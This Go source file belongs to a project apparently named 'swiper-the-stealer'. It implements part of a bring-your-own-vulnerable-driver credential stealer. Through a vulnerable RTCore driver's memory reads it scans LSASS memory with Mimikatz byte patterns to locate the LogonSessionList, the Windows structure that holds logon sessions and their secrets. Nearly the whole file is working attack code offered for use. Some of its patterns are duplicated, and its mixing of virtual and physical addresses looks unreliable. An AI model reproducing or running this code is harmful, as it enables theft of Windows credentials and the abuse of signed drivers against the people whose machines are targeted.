package byovd

import (
	"fmt"

	"swiper-the-stealer/pkg/logger"
)

// Real Mimikatz pattern constants (from actual source code)
var (
	// LogonSessionList patterns for different Windows versions
	PTRN_WN6x_LogonSessionList = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
	PTRN_WN1703_LogonSessionList = []byte{0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74}
	PTRN_WN1803_LogonSessionList = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
	PTRN_WN1903_LogonSessionList = []byte{0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84}
)

// Windows build number constants (from mimikatz)
const (
	KULL_M_WIN_BUILD_VISTA     = 6000
	KULL_M_WIN_BUILD_7         = 7600
	KULL_M_WIN_BUILD_8         = 9200
	KULL_M_WIN_BUILD_BLUE      = 9600
	KULL_M_WIN_BUILD_10_1507   = 10240
	KULL_M_WIN_BUILD_10_1511   = 10586
	KULL_M_WIN_BUILD_10_1607   = 14393
	KULL_M_WIN_BUILD_10_1703   = 15063
	KULL_M_WIN_BUILD_10_1803   = 17134
	KULL_M_WIN_BUILD_10_1903   = 18362
)

// Pattern reference structure (mimicking KULL_M_PATCH_GENERIC)
type PatternReference struct {
	MinBuildNumber uint32
	Pattern        []byte
	Offset0        int32
	Offset1        int32
}

// LogonSessionList pattern references (from real mimikatz source)
var LogonSessionListReferences = []PatternReference{
	{KULL_M_WIN_BUILD_VISTA, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_10_1507, PTRN_WN6x_LogonSessionList, 16, -4},
	{KULL_M_WIN_BUILD_10_1703, PTRN_WN1703_LogonSessionList, 23, -4},
	{KULL_M_WIN_BUILD_10_1803, PTRN_WN1803_LogonSessionList, 23, -4},
	{KULL_M_WIN_BUILD_10_1903, PTRN_WN6x_LogonSessionList, 23, -4},
}

// Real Mimikatz LSASS offset extractor
type LsassOffsetExtractor struct {
	rtcore    *RTCoreExploit
	logger    *logger.Logger
	buildNumber uint32
}

// NewLsassOffsetExtractor creates a new offset extractor using RTCore
func NewLsassOffsetExtractor(rtcore *RTCoreExploit, logger *logger.Logger) *LsassOffsetExtractor {
	return &LsassOffsetExtractor{
		rtcore:    rtcore,
		logger:    logger,
		buildNumber: 19045, // Default to Windows 10/11 recent
	}
}

// SetBuildNumber sets the Windows build number for pattern selection
func (loe *LsassOffsetExtractor) SetBuildNumber(buildNumber uint32) {
	loe.buildNumber = buildNumber
	loe.logger.Infof("🔧 Windows build number set to: %d", buildNumber)
}

// GetPatternForBuild returns the appropriate pattern for the current build
func (loe *LsassOffsetExtractor) GetPatternForBuild() *PatternReference {
	var selectedPattern *PatternReference
	
	for i := len(LogonSessionListReferences) - 1; i >= 0; i-- {
		if loe.buildNumber >= LogonSessionListReferences[i].MinBuildNumber {
			selectedPattern = &LogonSessionListReferences[i]
			break
		}
	}
	
	if selectedPattern == nil {
		// Fallback to most recent pattern
		selectedPattern = &LogonSessionListReferences[len(LogonSessionListReferences)-1]
		loe.logger.Warn("⚠️  No exact pattern match, using fallback pattern")
	}
	
	loe.logger.Infof("🎯 Selected pattern for build %d (min: %d)", loe.buildNumber, selectedPattern.MinBuildNumber)
	return selectedPattern
}

// ScanForLogonSessionList uses real Mimikatz pattern scanning to find LogonSessionList
func (loe *LsassOffsetExtractor) ScanForLogonSessionList(lsassBaseAddr uint64, lsassSize uint32) (uint64, error) {
	loe.logger.Info("🔍 Starting REAL Mimikatz pattern scanning for LogonSessionList...")
	
	pattern := loe.GetPatternForBuild()
	loe.logger.Infof("🎯 Using pattern: %d bytes, offsets: %d, %d", len(pattern.Pattern), pattern.Offset0, pattern.Offset1)
	
	// Scan LSASS memory using the real pattern
	patternAddr, err := loe.scanMemoryForPattern(lsassBaseAddr, lsassSize, pattern.Pattern)
	if err != nil {
		return 0, fmt.Errorf("pattern scan failed: %v", err)
	}
	
	if patternAddr == 0 {
		return 0, fmt.Errorf("LogonSessionList pattern not found in LSASS memory")
	}
	
	loe.logger.Infof("✅ Found pattern at address: 0x%X", patternAddr)
	
	// Apply offset0 to get to the instruction we need
	targetAddr := uint64(int64(patternAddr) + int64(pattern.Offset0))
	loe.logger.Infof("🎯 Target instruction at: 0x%X (pattern + %d)", targetAddr, pattern.Offset0)
	
	// Read the relative address from the instruction (like mimikatz does)
	relativeOffset, err := loe.rtcore.ReadPhysicalMemory(targetAddr, 4)
	if err != nil {
		return 0, fmt.Errorf("failed to read relative offset: %v", err)
	}
	
	// Convert bytes to int32 (little endian)
	relativeValue := int32(relativeOffset[0]) | 
					 int32(relativeOffset[1])<<8 | 
					 int32(relativeOffset[2])<<16 | 
					 int32(relativeOffset[3])<<24
	
	loe.logger.Infof("📊 Relative offset value: 0x%X (%d)", relativeValue, relativeValue)
	
	// Calculate final LogonSessionList address (like mimikatz does)
	logonSessionListAddr := uint64(int64(targetAddr) + int64(pattern.Offset1) + int64(relativeValue))
	loe.logger.Infof("🎉 Calculated LogonSessionList address: 0x%X", logonSessionListAddr)
	
	return logonSessionListAddr, nil
}

// scanMemoryForPattern performs pattern scanning in LSASS memory using RTCore
func (loe *LsassOffsetExtractor) scanMemoryForPattern(baseAddr uint64, size uint32, pattern []byte) (uint64, error) {
	loe.logger.Infof("🔍 Scanning 0x%X bytes starting at 0x%X for %d-byte pattern", size, baseAddr, len(pattern))
	
	const scanChunkSize uint32 = 0x1000 // 4KB chunks
	patternLen := uint32(len(pattern))
	
	for offset := uint32(0); offset < size-patternLen; offset += scanChunkSize {
		chunkSize := scanChunkSize
		if offset+chunkSize > size {
			chunkSize = size - offset
		}
		
		// Read chunk of memory
		currentAddr := baseAddr + uint64(offset)
		chunk, err := loe.rtcore.ReadPhysicalMemory(currentAddr, chunkSize)
		if err != nil {
			loe.logger.Debugf("❌ Failed to read chunk at 0x%X: %v", currentAddr, err)
			continue
		}
		
		// Search for pattern within this chunk
		for i := uint32(0); i <= chunkSize-patternLen; i++ {
			found := true
			for j := uint32(0); j < patternLen; j++ {
				if chunk[i+j] != pattern[j] {
					found = false
					break
				}
			}
			
			if found {
				foundAddr := currentAddr + uint64(i)
				loe.logger.Infof("✅ Pattern found at address: 0x%X", foundAddr)
				return foundAddr, nil
			}
		}
		
		if offset%0x10000 == 0 { // Progress every 64KB
			loe.logger.Debugf("📊 Scanned 0x%X / 0x%X bytes (%.1f%%)", offset, size, float64(offset)/float64(size)*100)
		}
	}
	
	return 0, nil // Pattern not found
}

// ExtractRealMSV1_0Offsets extracts the real MSV1_0 structure offsets using Mimikatz methodology
func (loe *LsassOffsetExtractor) ExtractRealMSV1_0Offsets(lsassBaseAddr uint64, lsassSize uint32) (map[string]uint64, error) {
	loe.logger.Info("🔥 Extracting REAL MSV1_0 offsets using Mimikatz methodology...")
	
	// Step 1: Find LogonSessionList using real pattern scanning
	logonSessionListAddr, err := loe.ScanForLogonSessionList(lsassBaseAddr, lsassSize)
	if err != nil {
		return nil, fmt.Errorf("failed to find LogonSessionList: %v", err)
	}
	
	offsets := map[string]uint64{
		"LogonSessionList": logonSessionListAddr,
	}
	
	loe.logger.Infof("✅ Successfully extracted LogonSessionList offset: 0x%X", logonSessionListAddr)
	
	return offsets, nil
}

// ValidateOffsets validates that the extracted offsets point to valid data structures
func (loe *LsassOffsetExtractor) ValidateOffsets(offsets map[string]uint64) error {
	loe.logger.Info("🔧 Validating extracted offsets...")
	
	logonSessionListAddr := offsets["LogonSessionList"]
	
	// Read the LogonSessionList pointer
	listPtr, err := loe.rtcore.ReadPhysicalMemory(logonSessionListAddr, 8)
	if err != nil {
		return fmt.Errorf("failed to read LogonSessionList pointer: %v", err)
	}
	
	// Convert to uint64
	listAddress := uint64(listPtr[0]) | 
				 uint64(listPtr[1])<<8 | 
				 uint64(listPtr[2])<<16 | 
				 uint64(listPtr[3])<<24 |
				 uint64(listPtr[4])<<32 | 
				 uint64(listPtr[5])<<40 | 
				 uint64(listPtr[6])<<48 | 
				 uint64(listPtr[7])<<56
	
	loe.logger.Infof("🎯 LogonSessionList points to: 0x%X", listAddress)
	
	// Basic validation - address should be in valid range
	if listAddress < 0x1000 || listAddress > 0x7FFFFFFFFFFF {
		return fmt.Errorf("invalid LogonSessionList address: 0x%X", listAddress)
	}
	
	loe.logger.Info("✅ Offset validation successful")
	return nil
}
